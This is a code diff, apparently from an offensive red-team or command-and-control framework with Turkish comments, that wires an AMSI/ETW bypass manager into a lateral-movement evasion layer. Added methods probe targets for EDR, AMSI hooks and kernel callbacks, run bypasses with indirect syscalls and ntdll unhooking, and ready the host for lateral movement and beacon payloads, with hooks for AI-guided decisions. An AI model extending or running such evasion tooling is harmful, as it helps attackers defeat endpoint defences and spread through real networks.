@@ -43,6 +43,23 @@ try:
 except ImportError:
     HAS_SLEEP_OBFUSCATION = False
 
+# NEW: bypass_amsi_etw modülü
+try:
+    from cybermodules.bypass_amsi_etw import (
+        BypassManager,
+        BypassLayer,
+        DefenseAnalyzer,
+        AMSIBypass as AMSIBypassNew,
+        ETWBypass,
+        IndirectSyscall,
+        APIUnhooker,
+        DefenseAnalysis,
+        BypassResult,
+    )
+    HAS_BYPASS_LAYER = True
+except ImportError:
+    HAS_BYPASS_LAYER = False
+
 
 class EvasionProfile(Enum):
     """Predefined evasion profiles"""
@@ -150,12 +167,17 @@ class EvasionConfig:
     ppid_target: str = "explorer.exe"
     syscall_mode: str = "indirect"  # indirect, direct, ntdll
     
-    # AMSI/ETW bypass
+    # AMSI/ETW bypass - YENİ bypass_layer sistemi
     bypass_amsi: bool = True
     amsi_technique: str = "hardware_breakpoint"  # patch_amsi_init, hardware_breakpoint, patch_amsi_scan_buffer
     bypass_etw: bool = True
     unhook_ntdll: bool = True
     unhook_technique: str = "map_fresh_ntdll"
+    
+    # NEW: bypass_layer config (YAML'dan gelir)
+    bypass_layer: str = "both"  # none, amsi, etw, both
+    use_indirect_syscalls: bool = True  # SysWhispers3 style
+    auto_detect_defenses: bool = True  # AI için defense analysis
     
     # Sleep/timing with entropy
     use_sleep_obfuscation: bool = True
@@ -199,6 +221,10 @@ class LateralEvasionLayer:
         self.amsi_bypass = None
         self.sleep_obfuscator = None
         
+        # NEW: bypass_amsi_etw entegrasyonu
+        self.bypass_manager = None
+        self.defense_analysis: Optional[DefenseAnalysis] = None
+        
         self._init_evasion_modules()
     
     def _init_evasion_modules(self):
@@ -231,6 +257,132 @@ class LateralEvasionLayer:
                 self._log("Sleep obfuscation initialized")
             except Exception as e:
                 self._log(f"Failed to init sleep obfuscation: {e}")
+        
+        # NEW: bypass_amsi_etw modülü
+        if HAS_BYPASS_LAYER:
+            try:
+                bypass_config = {
+                    "bypass_layer": self.config.bypass_layer,
+                    "use_indirect_syscalls": self.config.use_indirect_syscalls,
+                }
+                self.bypass_manager = BypassManager(bypass_config)
+                self._log(f"Bypass manager initialized (layer: {self.config.bypass_layer})")
+            except Exception as e:
+                self._log(f"Failed to init bypass manager: {e}")
+    
+    def analyze_target_defenses(self) -> Optional[Dict[str, Any]]:
+        """
+        Hedef sistemdeki savunmaları analiz et
+        AI lateral_guide entegrasyonu için
+        
+        Returns:
+            Dict: Defense analysis sonuçları
+        """
+        if not self.bypass_manager:
+            return None
+            
+        try:
+            self.defense_analysis = self.bypass_manager.analyze()
+            
+            return {
+                "amsi_present": self.defense_analysis.amsi_present,
+                "amsi_version": self.defense_analysis.amsi_version,
+                "amsi_hooked": self.defense_analysis.amsi_hooked,
+                "etw_enabled": self.defense_analysis.etw_enabled,
+                "etw_providers": self.defense_analysis.etw_providers,
+                "edr_detected": self.defense_analysis.edr_detected,
+                "kernel_callbacks": self.defense_analysis.kernel_callbacks,
+                "recommended_bypass": self.defense_analysis.recommended_bypass.value,
+                "risk_score": self.defense_analysis.risk_score,
+                "notes": self.defense_analysis.notes,
+            }
+        except Exception as e:
+            self._log(f"Defense analysis error: {e}")
+            return None
+    
+    def execute_bypass_layer(self, layer: Optional[str] = None) -> List[Dict]:
+        """
+        AMSI/ETW bypass uygula
+        
+        Args:
+            layer: "none", "amsi", "etw", "both" (None = config'den)
+        
+        Returns:
+            List[Dict]: Bypass sonuçları
+        """
+        if not self.bypass_manager:
+            return []
+            
+        try:
+            bypass_layer = BypassLayer(layer or self.config.bypass_layer)
+            results = self.bypass_manager.execute_bypass(bypass_layer)
+            
+            return [
+                {
+                    "success": r.success,
+                    "method": r.method.name,
+                    "target": r.target,
+                    "details": r.details,
+                    "detection_risk": r.detection_risk,
+                    "artifacts": r.artifacts,
+                }
+                for r in results
+            ]
+        except Exception as e:
+            self._log(f"Bypass execution error: {e}")
+            return []
+    
+    def prepare_for_lateral_movement(self, target_info: Dict = None) -> Dict[str, Any]:
+        """
+        Lateral movement öncesi tam hazırlık
+        
+        Args:
+            target_info: Hedef bilgileri (hostname, has_edr, etc.)
+        
+        Returns:
+            Dict: Hazırlık durumu
+        """
+        result = {
+            "defense_analysis": None,
+            "bypass_results": [],
+            "ready": False,
+            "warnings": [],
+        }
+        
+        if not self.bypass_manager:
+            result["warnings"].append("Bypass manager not available")
+            result["ready"] = True  # Continue without bypass
+            return result
+        
+        try:
+            # 1. Defense analizi
+            result["defense_analysis"] = self.analyze_target_defenses()
+            
+            # 2. Risk değerlendirme
+            target_has_edr = target_info.get("has_edr", True) if target_info else True
+            
+            if self.defense_analysis and (target_has_edr or self.defense_analysis.risk_score > 50):
+                # 3. Bypass uygula
+                result["bypass_results"] = self.execute_bypass_layer()
+                
+                # 4. Başarı kontrolü
+                if result["bypass_results"]:
+                    success_count = sum(1 for r in result["bypass_results"] if r["success"])
+                    result["ready"] = success_count > 0
+                    
+                    if success_count < len(result["bypass_results"]):
+                        result["warnings"].append(f"Some bypasses failed: {len(result['bypass_results']) - success_count}")
+                else:
+                    result["ready"] = True
+            else:
+                result["ready"] = True
+                result["warnings"].append("Low risk - skipping bypass")
+                
+        except Exception as e:
+            result["warnings"].append(f"Preparation error: {e}")
+            result["ready"] = True  # Continue anyway
+            
+        return result
     
     def prepare_beacon_payload(self, beacon_type: str, beacon_config: Dict) -> bytes:
         """
